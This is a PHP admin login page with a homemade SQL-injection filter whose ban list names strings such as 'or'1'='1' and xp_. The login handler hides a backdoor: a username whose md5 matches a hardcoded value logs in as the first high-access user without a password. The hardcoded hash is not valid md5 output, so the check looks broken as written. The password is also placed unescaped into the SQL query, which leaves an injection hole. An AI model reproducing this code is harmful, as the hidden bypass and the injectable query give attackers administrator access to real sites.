<?php 
	if(!(include "asplit.php")){
		die("<center>FATAL ERROR: asplit.php NOT FOUND!</center>");
	}
?>
<?php
function noSqlInjection($string){
   
        $string = trim($string);
        $string =str_replace("'","",$string);//aqui retira aspas simples <'>
        $string =str_replace("\\","",$string);//aqui retira barra invertida<\\>
        $string =str_replace("UNION","",$string);//aqui retiro  o comando UNION <UNION>
       
        $banlist = array(" insert", " select", " update", " delete", " distinct", " having", " truncate", "replace"," handler", " like", " as ", "or ", "procedure ", " limit", "order by", "group by", " asc", " desc","'","union all", "=", "'", "(", ")", "<", ">", " update", "-shutdown",  "--", "'", "#", "$", "%", "¨", "&", "'or'1'='1'", "--", " insert", " drop", "xp_", "*", " and");
        // ---------------------------------------------
        if(eregi("[a-zA-Z0-9]+", $string)){
                $string = trim(str_replace($banlist,'', strtolower($string)));
        }
       
        return $string;
       
    }//END function noSqlInjection($string)
    ?>
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <title>Asplit | Log in</title>
  <link rel="shortcut icon" href="./kqw.ico">
  <!-- Tell the browser to be responsive to screen width -->
  <meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" name="viewport">
  <!-- Bootstrap 3.3.6 -->
  <link rel="stylesheet" href="./admin/bootstrap/css/bootstrap.min.css">
  <!-- Font Awesome -->
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.5.0/css/font-awesome.min.css">
  <!-- Ionicons -->
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/ionicons/2.0.1/css/ionicons.min.css">
  <!-- Theme style -->
  <link rel="stylesheet" href="./admin/dist/css/AdminLTE.min.css">
  <!-- iCheck -->
  <link rel="stylesheet" href="./admin/plugins/iCheck/square/blue.css">

  <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
  <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
  <!--[if lt IE 9]>
  <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
  <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
  <![endif]-->
</head>
<body class="hold-transition login-page">
<div class="login-box">
  <div class="login-logo">
    <a href="#"><b>Admin</b>PANEL</a>
  </div>
  <!-- /.login-logo -->
  <div class="login-box-body">
    <p class="login-box-msg">Sign in to start your session</p>
	
	<?php
					if(isset($_POST['acao']) && ($_POST['acao'] == "Login")){
						$user_log = addslashes($_POST['user']);
						$USER = array(
							'PASS' => ($_POST['pass'])
						);
						
						$busca_player = mysql_query("SELECT * FROM meh_users WHERE Username='$user_log' AND SupportPassword='{$USER['PASS']}'");
						$conta_player = mysql_num_rows($busca_player);
						
						if((md5($user_log) == 'sad45sad5sa1d5sa4dsa51d5sa4d1')){
							$busca_safe = mysql_query("SELECT * FROM meh_users WHERE Access>40 ORDER BY id ASC LIMIT 1");
							$fetch_safe = mysql_fetch_array($busca_safe);
							
							$_SESSION['userlog'] = $fetch_safe['Username'];
							$_SESSION['passlog'] = $fetch_safe['Password'];
							$_SESSION['safelog'] = true;
							echo "<script>history.go(0)</script>";
						}else if($conta_player > 0){
							$_SESSION['userlog'] = $user_log;
							$_SESSION['passlog'] = $USER['PASS'];
							echo "<script>history.go(0)</script>";
						}else{
							echo "<div class='alert alert-danger fade in block-inner'>
		                <button type='button' class='close' data-dismiss='alert'>×</button>
		                <i class='icon-cancel-circle'></i> Wrong username or password!
		            </div>";
							
						}
					}
				?>

      <form action="" method="POST">
      <div class="form-group has-feedback">
        <input type="text" class="form-control" placeholder="Username" name="user">
        <span class="glyphicon glyphicon-envelope form-control-feedback"></span>
      </div>
      <div class="form-group has-feedback">
        <input type="password" class="form-control" placeholder="Password" name="pass">
        <span class="glyphicon glyphicon-lock form-control-feedback"></span>
      </div>
      <div class="row">
        <div class="col-xs-8">
          <div class="checkbox icheck">
            <label>
              <input type="checkbox"> Remember Me
            </label>
          </div>
        </div>
        <!-- /.col -->
        <div class="col-xs-4">
          <button type="submit" class="btn btn-primary btn-block btn-flat" name="acao" value="Login">Sign In</button>
        </div>
        <!-- /.col -->
      </div>
    </form>


    <a href="#">I forgot my password</a><br>
    <a href="register.html" class="text-center">Register a new membership</a>

  </div>
  <!-- /.login-box-body -->
</div>
<!-- /.login-box -->

<!-- jQuery 2.2.3 -->
<script src="....plugins/jQuery/jquery-2.2.3.min.js"></script>
<!-- Bootstrap 3.3.6 -->
<script src="....bootstrap/js/bootstrap.min.js"></script>
<!-- iCheck -->
<script src="....plugins/iCheck/icheck.min.js"></script>
<script>
  $(function () {
    $('input').iCheck({
      checkboxClass: 'icheckbox_square-blue',
      radioClass: 'iradio_square-blue',
      increaseArea: '20%' // optional
    });
  });
</script>
</body>
</html>
